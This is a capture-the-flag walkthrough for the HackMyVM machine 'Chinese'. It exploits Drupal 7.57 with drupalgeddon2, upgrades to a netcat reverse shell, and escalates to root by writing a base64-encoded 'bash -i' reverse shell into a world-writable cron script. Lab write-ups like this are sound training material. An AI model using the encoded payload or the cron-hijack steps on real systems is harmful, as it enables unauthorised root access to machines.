# Chinese

A hackmyvm machine.

Difficulty: Easy

## Enumeration

An nmap scan reveals the following open ports:
- Port 22: SSH
- Port 80: Running Drupal 7
- Port 111: RPC
- Port 58283: RPC


## Port 80

- Port 80 is running Drupal 7.
- `/robots.txt` is present, so we can check the page to find out what Drupal version is running on the server. To do this, look at `/CHANGELOG.txt`.
- Here we can see that the server is running **Drupal 7.57**.
- This is vulnerable to `drupalgeddon2`, whose exploit can be found [here](https://www.exploit-db.com/exploits/44449).

> NOTE: The exploit might give an error saying it cant include `highline/import`. In this case, just run `gem install highline` on the command line and run the exploit again.

- This gives us a simple shell. Upgrade this shell to a full reverse shell as follows:

1. Go to [revshells.com](https://www.revshells.com/), fill in your IP and port, and select the `python3 #2` shell.
2. Start a netcat listener on the port you specified.
3. Execute this command in the pseudo-shell provided by the exploit. 
4. In the netcat reverse shell run `script /dev/null -c /bin/bash` to get a full bash tty.
5. Run `export TERM=xterm` and then press `ctrl+z`.
6. Now in the command line, run `stty raw -echo; fg` to get a fully upgraded shell.

- With this we gain the shell as `www-data`, and can find the user flag at `/var/www/user.txt`.

## Privilege Escalation to Root

- In the `/opt` directory, we can see a file called `task.sh`.
- Running `ls -la /opt`:

```bash
www-data@chinese:/$ ls -la /opt
total 12
drwxr-xr-x  2 root root 4096 Sep 13 08:04 .
drwxr-xr-x 30 root root 4096 Oct 29 21:02 ..
-rwxrwxrwx  1 root root   98 Nov 24 07:39 task.sh
```

- We can see that `task.sh` is world readable and writable, and is owned by root, which means that if we can somehow execute the contents of this file as root, we can gain a root shell.
- Using `nano` to edit the `task.sh` file to add a malicious payload:

```bash
www-data@chinese:/$ cat /opt/task.sh 
#!/bin/bash

echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTEwLzY2NjYgMD4mMQ== | base64 -d | bash
```

- Here I added a base64 encoded reverse shell payload. You can create this in [revshells.com](https://www.revshells.com/) by setting the *encoding* option to base64. The payload I used was the `bash -i` payload and set the port to 6666
- Checking `/etc/crontab` we can see this

```bash
www-data@chinese:/$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root /opt/task.sh
```

- So we have a world-readable and writable root owned file that's executed periodically as a cron job. This is how we can gain root access on the box.
- So after adding the payload to the `task.sh` file, we'll start a listener on the attacker box on port 6666.
- Wait for a minute or two and we'll automatically gain the root shell connection.
- Root flag is at `/root/root.txt`.


Happy Hacking :)
